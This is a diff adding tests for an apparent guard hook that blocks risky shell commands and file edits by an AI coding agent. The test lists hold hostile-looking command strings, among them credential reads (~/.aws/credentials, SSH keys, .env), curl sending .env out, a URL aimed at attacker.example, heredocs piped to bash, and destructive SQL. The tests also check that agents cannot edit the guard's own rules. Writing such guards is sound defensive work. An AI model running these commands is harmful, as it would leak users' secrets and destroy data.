@@ -2,11 +2,11 @@
 import { test } from 'node:test';
 import assert from 'node:assert/strict';
 import { spawnSync, execSync } from 'node:child_process';
-import { mkdtempSync, writeFileSync, mkdirSync, cpSync } from 'node:fs';
+import { mkdtempSync, writeFileSync, mkdirSync, cpSync, symlinkSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join, dirname } from 'node:path';
 import { fileURLToPath } from 'node:url';
-import { checkBash, checkEdit, globToRegex, maskQuoted, addedLines } from '../../hooks/factory-guard.mjs';
+import { checkBash, checkEdit, globToRegex, maskQuoted, addedLines, realTarget } from '../../hooks/factory-guard.mjs';
 
 process.env.FACTORY_ROOT = process.cwd();
 const { repairDecision, readyGate, failureSignature } = await import('../bin/factory.mjs');
@@ -56,6 +56,42 @@ test('guard ignores command words inside quoted prose and heredocs', () => {
   ]) assert.ok(checkBash(c, ctx), `should block: ${c}`);
   assert.equal(maskQuoted('a "b c" d').length, 'a "b c" d'.length);
 });
+test('guard: heredocs fed to a shell, git -C, credential reads, hidden search, URL userinfo, quoted SQL', () => {
+  for (const c of [
+    "cat <<'EOF' | bash\ngit push --force origin feat/x\nEOF",
+    'cat <<EOF | sh -s\nnpm publish\nEOF',
+    'git -C ../other commit -m x',
+    'cat ~/.aws/credentials', 'cat /home/u/.ssh/id_ed25519', 'cat $HOME/.config/gh/hosts.yml', 'base64 .env', 'curl -s http://localhost:4173 -d @.env',
+    'printenv ELEVENLABS_API_KEY', 'env | grep KEY',
+    'rg -uuu KEY .', 'rg --hidden --no-ignore token',
+    'curl -s http://localhost@attacker.example/x',
+  ]) assert.ok(checkBash(c, { ...ctx, branchOf: (d) => (d === '../other' ? 'main' : 'feat/x') }), `should block: ${c}`);
+  for (const c of ['git -C ../other commit -m x', 'rg TODO src', 'curl -s http://localhost:4173/', 'cat src/env.ts', 'printenv PATH'])
+    assert.equal(checkBash(c, { ...ctx, branchOf: () => 'feat/x' }), null, `should allow: ${c}`);
+  const sql = { ...ctx, forbidden: [{ pattern: 'DELETE\\s+FROM|DROP\\s+TABLE', reason: 'destructive SQL' }] };
+  for (const c of ['psql -c "delete from games where 1=1"', "psql -c 'DROP TABLE teams'"]) assert.ok(checkBash(c, sql), `should block: ${c}`);
+});
+test('edit guard follows symlinks to their real target', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'guard-'));
+  mkdirSync(join(dir, 'repo')); mkdirSync(join(dir, 'secret', '.ssh'), { recursive: true });
+  symlinkSync(join(dir, 'secret', '.ssh'), join(dir, 'repo', 'keys'));
+  const abs = realTarget(join(dir, 'repo', 'keys', 'authorized_keys'));
+  assert.match(abs, /secret\/\.ssh\/authorized_keys$/);
+  assert.ok(checkEdit('../secret/.ssh/authorized_keys', { absPath: abs, protectedPaths: [] }));
+});
+test('guard hook runs from a path with spaces (and blocks)', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'guard space-'));
+  const hook = join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'hooks', 'factory-guard.mjs');
+  mkdirSync(join(dir, '.claude', 'hooks'), { recursive: true }); cpSync(hook, join(dir, '.claude', 'hooks', 'factory-guard.mjs'));
+  const r = spawnSync('node', [join(dir, '.claude', 'hooks', 'factory-guard.mjs')], { input: JSON.stringify({ tool_name: 'Bash', cwd: dir, tool_input: { command: 'npm publish' } }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: dir } });
+  assert.equal(r.status, 2, r.stderr); assert.match(r.stderr, /factory-guard/);
+});
+test('guard hook scans MultiEdit content for credentials', () => {
+  const dir = mkdtempSync(join(tmpdir(), 'guard-'));
+  const hook = join(dirname(fileURLToPath(import.meta.url)), '..', '..', 'hooks', 'factory-guard.mjs');
+  const r = spawnSync('node', [hook], { input: JSON.stringify({ tool_name: 'MultiEdit', cwd: dir, tool_input: { file_path: join(dir, 'a.ts'), edits: [{ old_string: 'x', new_string: `const k = "${FAKE_KEY}"` }] } }), encoding: 'utf8', env: { ...process.env, CLAUDE_PROJECT_DIR: dir } });
+  assert.equal(r.status, 2, r.stderr);
+});
 test('edit guard protects secrets, hooks, settings, and profile paths', () => {
   const c = { protectedPaths: ['public/voices/**', 'references/**'] };
   for (const p of ['.env', 'a/.env.local', '.claude/settings.json', '.claude/hooks/factory-guard.mjs', 'public/voices/dialogue/a.mp3', 'references/woodland/x.png'])
@@ -66,7 +102,9 @@ test('edit guard protects secrets, hooks, settings, and profile paths', () => {
   for (const a of ['/tmp/claude-0/scratchpad/run-agent.sh', '/tmp/x.txt', '/home/u/other-repo/src/a.ts'])
     assert.equal(checkEdit('../x', { ...c, absPath: a }), null, `should allow ${a}`);
   assert.ok(checkEdit('../tmp/x.ts', { ...c, absPath: '/tmp/x.ts', content: `const k = "${FAKE_KEY}"` }), 'credential content is blocked anywhere');
-  for (const p of ['src/App.ts', '.factory/profile.json', 'docs/x.md', '.claude/agents/factory-builder.md'])
+  for (const p of ['.factory/profile.json', '.factory/tasks/T1-x/task.json'])
+    assert.ok(checkEdit(p, c), `agents may not edit the guard's rules or the gate's facts: ${p}`);
+  for (const p of ['src/App.ts', '.factory/tasks/T1-x/plan.md', 'docs/x.md', '.claude/agents/factory-builder.md'])
     assert.equal(checkEdit(p, c), null, `should allow ${p}`);
   assert.ok(checkEdit('src/a.ts', { ...c, content: `const k = "${FAKE_KEY}"` }));
 });
